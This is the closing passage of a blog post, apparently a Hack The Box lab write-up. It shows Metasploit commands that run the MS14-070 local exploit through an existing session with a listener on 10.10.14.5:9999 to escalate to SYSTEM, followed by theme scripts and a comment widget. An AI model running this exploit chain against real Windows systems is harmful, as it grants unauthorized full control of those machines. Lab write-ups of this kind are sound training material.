+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.34.09.png" alt="截屏2021-10-13 下午3.34.09"><br>使用 ms14-070 进行提权，成功提为 system 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/<span class="built_in">local</span>/ms14_070_tcpip_ioctl</span><br><span class="line">msf &gt; <span class="built_in">set</span> session 1</span><br><span class="line">msf &gt; <span class="built_in">set</span> lhost 10.10.14.5</span><br><span class="line">msf &gt; <span class="built_in">set</span> lport 9999</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/bf422474/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%883.42.06.png" alt="截屏2021-10-13 下午3.42.06"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/c1de20d7/">HTB: Arctic<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
